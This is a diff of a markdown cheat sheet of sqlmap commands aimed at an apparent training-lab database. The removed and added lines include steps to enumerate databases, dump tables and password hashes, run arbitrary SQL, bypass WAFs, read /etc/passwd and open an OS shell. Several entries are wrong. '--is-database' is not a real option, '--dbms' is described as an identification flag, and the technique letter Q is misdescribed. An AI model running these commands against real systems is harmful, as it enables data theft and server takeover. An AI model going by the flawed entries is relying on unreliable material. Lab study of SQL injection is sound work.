@@ -1,68 +1,126 @@
-List Databases:
+# SQLMap Commands Documentation
 
-sqlmap -r req4.txt --dbs
-Enumerates all databases in the target system.
-List Tables:
+A concise list of SQLMap commands used, along with a brief description for each:
 
-sqlmap -r req4.txt -D peh-labs --tables
-Lists all tables in a specific database.
-List Columns:
+---
 
-sqlmap -r req4.txt -D peh-labs -T injection0x03_products --columns
-Lists all columns in a specific table.
-Dump Specific Columns:
+1. **List Databases**
+    ```bash
+    sqlmap -r req4.txt --dbs
+    ```
+    - Enumerates all databases in the target system.
 
-sqlmap -r req4.txt -D peh-labs -T injection0x03_products -C name,price --dump
-Dumps data from specific columns in a table.
-Search for Data:
+2. **List Tables**
+    ```bash
+    sqlmap -r req4.txt -D peh-labs --tables
+    ```
+    - Lists all tables in a specific database.
 
-sqlmap -r req4.txt --search -C email --string '@gmail.com'
-Searches for specific data within the database.
-Bypass WAF:
+3. **List Columns**
+    ```bash
+    sqlmap -r req4.txt -D peh-labs -T injection0x03_products --columns
+    ```
+    - Lists all columns in a specific table.
 
-sqlmap -r req4.txt --tamper=space2comment
-Uses a tamper script to bypass Web Application Firewalls.
-Custom User-Agent:
+4. **Dump Data**
+    ```bash
+    sqlmap -r req4.txt -D peh-labs -T injection0x03_products -C product_name --dump
+    ```
+    - Extracts the data of specific columns from a table.
 
-sqlmap -r req4.txt --user-agent="Mozilla/5.0 ... Chrome/92.0.4515.107 Safari/537.36"
-Spoofs a browser User-Agent to bypass restrictions.
-Time-Based Blind SQL Injection:
+5. **Dump All Data from a Table**
+    ```bash
+    sqlmap -r req4.txt -D peh-labs -T injection0x03_products --dump
+    ```
+    - Extracts all data from a specific table.
 
-sqlmap -r req4.txt --time-sec=10
-Exploits time-based blind SQL injection vulnerabilities.
-Read File from Server:
+6. **Retrieve Banner**
+    ```bash
+    sqlmap -r req4.txt --banner
+    ```
+    - Retrieves the database banner (version information).
 
-sqlmap -r req4.txt --file-read=/etc/passwd
-Reads a file from the server using SQL injection.
-Execute OS Command:
+7. **Identify DBMS**
+    ```bash
+    sqlmap -r req4.txt --dbms
+    ```
+    - Identifies the type of database management system (DBMS).
 
-sqlmap -r req4.txt --os-cmd="whoami"
-Executes a system command via SQL injection.
-List Database Users:
+8. **Check for SQL Injection Vulnerability**
+    ```bash
+    sqlmap -r req4.txt --is-database
+    ```
+    - Checks if the target URL is vulnerable to SQL injection.
 
-sqlmap -r req4.txt --users
-Enumerates all database users in the system.
-Check User Privileges:
+9. **Get Users**
+    ```bash
+    sqlmap -r req4.txt --users
+    ```
+    - Retrieves a list of database users.
 
-sqlmap -r req4.txt --privileges -U dbuser
-Checks the privileges of a specific database user.
-OS Command Injection Test:
+10. **Get User Privileges**
+    ```bash
+    sqlmap -r req4.txt --privileges
+    ```
+    - Retrieves the privileges of database users.
 
-sqlmap -r req4.txt --os-shell
-Tests for OS command injection vulnerabilities.
-Code Injection Test:
+11. **Get Passwords**
+    ```bash
+    sqlmap -r req4.txt --passwords
+    ```
+    - Retrieves the hashed passwords of database users.
 
-sqlmap -r req4.txt --code
-Checks for potential code injection vulnerabilities.
-Use a Proxy:
+12. **Enumerate Schema**
+    ```bash
+    sqlmap -r req4.txt --schema
+    ```
+    - Enumerates the database schema.
 
-sqlmap -r req4.txt --proxy=http://127.0.0.1:8080
-Routes SQLMap traffic through a proxy server.
-Adjust Level and Risk:
+13. **Search for Specific Data**
+    ```bash
+    sqlmap -r req4.txt --search "keyword"
+    ```
+    - Searches for specific data in the database.
 
-sqlmap -r req4.txt --level=5 --risk=3
-Increases the level and risk for more aggressive testing.
-Automated Testing:
+14. **List All Databases and Tables**
+    ```bash
+    sqlmap -r req4.txt --tables --all-databases
+    ```
+    - Lists all databases and their tables.
 
-sqlmap -r req4.txt --batch
-Runs SQLMap in automated mode with all tests.
+15. **Check Injection Point**
+    ```bash
+    sqlmap -r req4.txt --risk=3 --level=5
+    ```
+    - Checks for SQL injection points with higher risk and level.
+
+16. **Bypass WAF/Filters**
+    ```bash
+    sqlmap -r req4.txt --tamper=space2comment
+    ```
+    - Attempts to bypass web application firewalls (WAFs) or filters using tampering techniques.
+
+17. **Run SQL Queries**
+    ```bash
+    sqlmap -r req4.txt --sql-query "SELECT * FROM users"
+    ```
+    - Executes custom SQL queries on the database.
+
+18. **Set Maximum Number of Concurrent Requests**
+    ```bash
+    sqlmap -r req4.txt --threads=10
+    ```
+    - Sets the number of concurrent requests to increase performance.
+
+19. **Save Output to File**
+    ```bash
+    sqlmap -r req4.txt --output-dir=/path/to/save
+    ```
+    - Saves the output to a specified directory.
+
+20. **Check for All Supported SQL Injection Techniques**
+    ```bash
+    sqlmap -r req4.txt --technique=BEUSTQ
+    ```
+    - Checks for all supported SQL injection techniques (Boolean-based, Error-based, Union-based, Stacked queries, Time-based, and Out-of-band).
+
